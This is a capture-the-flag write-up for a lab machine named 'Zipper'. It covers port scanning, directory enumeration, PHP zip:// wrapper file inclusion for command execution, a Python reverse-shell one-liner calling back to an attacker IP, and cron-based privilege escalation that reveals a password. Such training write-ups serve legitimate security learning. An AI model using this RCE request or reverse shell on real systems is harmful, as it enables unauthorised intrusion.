# nmap
```
┌──(kali㉿kali)-[~/PG/zipper]
└─$ nmap -p- --min-rate 10000 192.168.102.229
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 07:12 EDT
Nmap scan report for 192.168.102.229
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 9.21 seconds
                                                                                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/PG/zipper]
└─$ nmap -p 22,80 -sCV 192.168.102.229       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-19 07:12 EDT
Nmap scan report for 192.168.102.229
Host is up (0.010s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.69 seconds
```

![Pasted image 20250319191408](<0. Attachments/Pasted image 20250319191408.png>)

# web enum
![Pasted image 20250319191502](<0. Attachments/Pasted image 20250319191502.png>)
```
┌──(kali㉿kali)-[~/PG/zipper]
└─$ dirsearch -u http://192.168.102.229/    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
/home/kali/.local/lib/python3.12/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PG/zipper/reports/http_192.168.102.229/__25-03-19_07-16-37.txt

Target: http://192.168.102.229/

[07:16:37] Starting: 
[07:16:44] 403 -  280B  - /.ht_wsr.txt                                      
[07:16:44] 403 -  280B  - /.htaccess.bak1                                   
[07:16:45] 403 -  280B  - /.htaccess.sample                                 
[07:16:45] 403 -  280B  - /.htaccess.save                                   
[07:16:45] 403 -  280B  - /.htaccess_extra
[07:16:45] 403 -  280B  - /.htaccess.orig                                   
[07:16:45] 403 -  280B  - /.htaccess_orig
[07:16:45] 403 -  280B  - /.htaccessBAK
[07:16:45] 403 -  280B  - /.htaccessOLD2
[07:16:45] 403 -  280B  - /.html                                            
[07:16:45] 403 -  280B  - /.htaccessOLD
[07:16:45] 403 -  280B  - /.htm                                             
[07:16:45] 403 -  280B  - /.htpasswd_test                                   
[07:16:45] 403 -  280B  - /.httr-oauth                                      
[07:16:45] 403 -  280B  - /.htpasswds                                       
[07:16:45] 403 -  280B  - /.htaccess_sc                                     
[07:16:48] 403 -  280B  - /.php                                             
[07:19:19] 403 -  280B  - /server-status                                    
[07:19:22] 403 -  280B  - /server-status/                                   
[07:19:32] 200 -  145B  - /style                                            
[07:19:41] 200 -    0B  - /upload.php                                       
[07:19:41] 301 -  320B  - /uploads  ->  http://192.168.102.229/uploads/     
[07:19:41] 403 -  280B  - /uploads/                                         
```

![Pasted image 20250408111141](<0. Attachments/Pasted image 20250408111141.png>)

![Pasted image 20250408111435](<0. Attachments/Pasted image 20250408111435.png>)

![Pasted image 20250408111821](<0. Attachments/Pasted image 20250408111821.png>)
there is an upload.php, maybe we can see its source

![Pasted image 20250408112011](<0. Attachments/Pasted image 20250408112011.png>)

Sending our cmd.php, we capture the request for the zip file download and get
![Pasted image 20250408121257](<0. Attachments/Pasted image 20250408121257.png>)
```
GET /uploads/upload_1744082673.zip
```

[PHP ZIP:// wrapper for RCE – Cyber Security Architect | Red/Blue Teaming | Exploit/Malware Analysis](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/)

![Pasted image 20250408122023](<0. Attachments/Pasted image 20250408122023.png>)
I dont know how we should know the file path is var/www/html

```
GET /index.php?file=zip:///var/www/html/uploads/upload_1744082673.zip%23cmd&cmd=id HTTP/1.1
```

# initial access

![Pasted image 20250408122521](<0. Attachments/Pasted image 20250408122521.png>)

```
python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("192.168.45.213",4444))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'
```

![Pasted image 20250408122610](<0. Attachments/Pasted image 20250408122610.png>)

# priv esc
![Pasted image 20250408123129](<0. Attachments/Pasted image 20250408123129.png>)

![Pasted image 20250408123444](<0. Attachments/Pasted image 20250408123444.png>)

![Pasted image 20250408123855](<0. Attachments/Pasted image 20250408123855.png>)

idk might be a password 
```
WildCardsGoingWild
```

since its a cron we can check whats happening with pspy32
![Pasted image 20250408124558](<0. Attachments/Pasted image 20250408124558.png>)

seems like it is a password

# root and flags
![Pasted image 20250408124700](<0. Attachments/Pasted image 20250408124700.png>)

![Pasted image 20250408124837](<0. Attachments/Pasted image 20250408124837.png>)

